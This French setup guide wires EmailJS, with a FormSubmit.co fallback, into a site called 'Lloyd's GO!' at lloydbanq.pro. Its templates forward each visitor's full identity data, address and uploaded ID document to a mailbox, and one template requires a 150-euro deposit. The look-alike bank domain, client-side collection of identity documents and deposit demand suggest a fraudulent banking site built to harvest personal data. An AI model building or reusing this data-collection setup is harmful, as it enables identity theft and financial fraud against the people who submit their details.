# Configuration EmailJS pour Lloyd's GO!

## 📧 Configuration complète pour support@lloydbanq.pro

### 🔧 Étapes de configuration EmailJS

#### 1. Créer un compte EmailJS
1. Aller sur https://www.emailjs.com/
2. Créer un compte avec l'email support@lloydbanq.pro
3. Vérifier l'email

#### 2. Configurer le service email
1. Dans le dashboard EmailJS, aller dans "Email Services"
2. Cliquer "Add New Service"
3. Choisir le fournisseur email (Gmail, Outlook, etc.)
4. Configurer avec support@lloydbanq.pro
5. Nommer le service: `service_lloydbanq`

#### 3. Créer les templates d'email

##### Template KYC Submission (`template_kyc_submission`)
```
Subject: Nouvelle demande KYC - {{first_name}} {{last_name}}

=== NOUVELLE DEMANDE KYC - LLOYD'S GO! ===

📋 INFORMATIONS PERSONNELLES:
• Prénom: {{first_name}}
• Nom: {{last_name}}
• Email: {{from_email}}
• Téléphone: {{phone}}
• Date de naissance: {{birth_date}}
• Nationalité: {{nationality}}
• Âge: {{age}} ans

🏠 ADRESSE DE RÉSIDENCE:
• Pays: {{country}}
• Adresse: {{address}}
• Code postal: {{postal_code}}
• Ville: {{city}}

📄 DOCUMENTS TÉLÉCHARGÉS:
• Document d'identité: {{documents_uploaded}}
• Nom du fichier: {{document_name}}

📅 INFORMATIONS DE SOUMISSION:
• Date de soumission: {{submission_date}}
• ID utilisateur: {{user_id}}

⚠️ CONDITIONS DE VALIDATION:
• Dépôt minimum requis: 150 euros
• Âge minimum: 18 ans ✓

---
Ce message a été généré automatiquement par le système KYC de Lloyd's GO!
Pour toute question, contactez: support@lloydbanq.pro
```

##### Template Confirmation Utilisateur (`template_confirmation`)
```
Subject: Confirmation de soumission KYC - Lloyd's GO!

{{message}}
```

##### Template Contact (`template_contact`)
```
Subject: {{subject}}

=== NOUVEAU MESSAGE DE CONTACT ===

De: {{from_name}} ({{from_email}})
Téléphone: {{phone}}

Message:
{{message}}

---
Envoyé depuis Lloyd's GO!
```

##### Template Support (`template_support`)
```
Subject: Demande de support - {{category}}

=== DEMANDE DE SUPPORT ===

De: {{from_name}} ({{from_email}})
Catégorie: {{category}}
Priorité: {{priority}}

Message:
{{message}}

---
Envoyé depuis Lloyd's GO!
```

##### Template Notification (`template_notification`)
```
Subject: Notification système - {{event_type}}

=== NOTIFICATION SYSTÈME ===

Type d'événement: {{event_type}}
Utilisateur: {{user_id}}
Horodatage: {{timestamp}}

Détails:
{{message}}

---
Système Lloyd's GO!
```

#### 4. Configuration des clés API

##### Clé publique actuelle:
```javascript
publicKey: 'hl7JMrU9PcgBIwX8c'
```

##### Service ID:
```javascript
serviceId: 'service_lloydbanq'
```

### 🚀 Fonctionnalités implémentées

#### ✅ Emails automatiques
- **KYC Submissions**: Envoi automatique à support@lloydbanq.pro
- **Confirmations utilisateur**: Email de confirmation automatique
- **Notifications système**: Alertes automatiques
- **Messages de contact**: Formulaires de contact
- **Demandes de support**: Tickets de support

#### ✅ Système de fallback
- **Service principal**: EmailJS
- **Service de secours**: FormSubmit.co
- **Mode démo**: Simulation locale si tous les services échouent

#### ✅ Données collectées automatiquement
- Informations personnelles complètes
- Adresse de résidence
- Documents téléchargés (nom, taille, type)
- Horodatage précis
- ID utilisateur unique
- Validation d'âge automatique

### 📊 Utilisation des fonctions

#### Envoi KYC (automatique)
```javascript
// Appelé automatiquement lors de la soumission KYC
submitKYC() // Collecte et envoie toutes les données
```

#### Envoi email générique
```javascript
// Email de contact
sendEmail('contact', {
    name: 'Utilisateur',
    email: 'user@example.com',
    subject: 'Question sur le service',
    message: 'Bonjour, j\'ai une question...',
    phone: '+33 1 23 45 67 89'
});

// Demande de support
sendEmail('support', {
    name: 'Utilisateur',
    email: 'user@example.com',
    category: 'Problème technique',
    message: 'J\'ai un problème avec...',
    priority: 'Urgent'
});
```

#### Notifications système
```javascript
// Notification automatique
sendSystemNotification('LOGIN', 'Nouvelle connexion utilisateur');
sendSystemNotification('DOCUMENT_UPLOAD', 'Document d\'identité téléchargé');
sendSystemNotification('KYC_SUBMITTED', 'Nouvelle soumission KYC');
```

### 🔒 Sécurité

- **Clés publiques uniquement**: Pas d'exposition de clés privées
- **Validation côté client**: Vérification des données avant envoi
- **Logs détaillés**: Traçabilité complète des envois
- **Services de fallback**: Redondance en cas de panne

### 📈 Monitoring

- **Logs console**: Suivi en temps réel
- **Notifications utilisateur**: Feedback immédiat
- **Statuts de soumission**: Persistance des états
- **Historique**: Sauvegarde dans sessionStorage

---
**Configuration terminée ✅**
Le site HTML est maintenant entièrement relié à support@lloydbanq.pro
